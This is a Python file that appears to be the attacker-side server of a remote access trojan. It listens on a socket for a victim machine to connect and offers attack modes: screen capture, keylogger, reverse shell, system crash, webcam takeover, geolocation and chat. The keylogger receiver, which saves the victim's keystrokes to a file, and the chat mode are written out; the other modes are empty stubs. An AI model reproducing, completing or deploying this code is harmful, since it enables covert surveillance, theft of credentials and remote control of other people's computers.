from keyboard import *
import socket
import os
import sys
from time import sleep
import pyautogui
class Server:
#server code starts here
    def __init__(self):
        self.host = "192.168.43.150"
        self.port = 9090
        self.route = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    def binding(self):#binding ip to port
        try:
            self.route.bind((self.host, self.port))
            self.route.listen(1)
            print("host - port binding was successfull..\n")
            self.waiting()#CALLED THE WAITING METHOD
        except socket.error as err:
            print("binding error", err)
            #incase of socket error we will call the function again

    def waiting(self):#waiting for the target to connect to blacksheep
        try:
            print("waiting for connection...")
            self.channel, self.address = self.route.accept()
            print("connection was established")
            sleep(2)
            self.attack_modes()
        except socket.error as err:
            self.waiting()
        except KeyboardInterrupt:
            print("\n YOU CLOSED THE CONNECTION")
            self.channel.close()
            self.route.close()
    def main(self):
        try:
            self.binding()
        except socket.error as err:
            print("SOCKET ERROR", err)
        except AttributeError as err:
            print("ATRIBUTE ERROR", err)
#server code stops here

#ATTACK MODES STARTS HERE...................................
    def attack_modes(self):
        try:
            print("1: screenshare")
            print("2: Keylogger")
            print("3: shell")
            print("4: crash")
            print("5: webcam")
            print("6: Geolocate")
            print("7: chat")
            self.choice = int(input("choose your attack mode: "))
            if self.choice == 1:
                #screen recording goes here
                print("SCREEN MODE ACTIVATED")
                self.test = "1".encode("utf-8")
                self.channel.send(self.test)
                self.screen_record()
                pass
            if self.choice == 2:
                #keylogger codes goes here
                print("KEYLOGGER MODE ACTIVATED")
                self.test = "2".encode("utf-8")
                self.channel.send(self.test)
                self.keylogger()
            if self.choice == 3:
                #screen reverse shell goes here
                print("REVERSE SHELL MODE ACTIVATED")
                self.test = "3".encode("utf-8")
                self.channel.send(self.test)
                self.reverse_shell()
                pass
            if self.choice == 4:
                #crashing the entire system
                print("MALWARE MODE ACTIVATED")
                self.test = "4".encode("utf-8")
                self.channel.send(self.test)
                self.crash_sys()
                pass
            if self.choice == 5:
                #take over cameras and audio
                print("WEBCAM MODE ACTIVATED")
                self.test = "5".encode("utf-8")
                self.channel.send(self.test)
                self.webcam()
                pass
            if self.choice == 6:
                #get the exact locations
                print("GEOLOCATION MODE ACTIVATED")
                self.test = "6".encode("utf-8")
                self.channel.send(self.test)
                self.geolocate()                    
                pass
            if self.choice == 7:
                print("CHAT MODE ACTIVATED")
                self.test = "7".encode("utf-8")
                self.channel.send(self.test)
                #chat with client
                self.chat()                    
                pass
        except ValueError as err:
            print("invalid data type: ", err)

    #screen recording goes here
    def screen_record(self):
        
        pass

    #keylogger codes goes here 
    def keylogger(self):
        while True:
            self.key = self.channel.recv(1024).decode("utf-8")
            if not self.key or self.key == "END":
                break
            print(self.key)
            with open("keylogs.json", "a") as self.file:
                self.file.write(f"{self.key[3:]} ")

    #screen reverse shell goes here
    def reverse_shell(self):
        
        pass

    #crashing the entire system
    def crash_sys(self):
        
        pass

    #take over cameras and audio
    def webcam(self):
        
        pass

    #get the exact locations
    def geolocate(self):
        
        pass

    #chat with victim
    def chat(self):
        while True:
            self.test = input(">> ").encode("utf-8")
            self.channel.send(self.test)

f = Server()
f.main()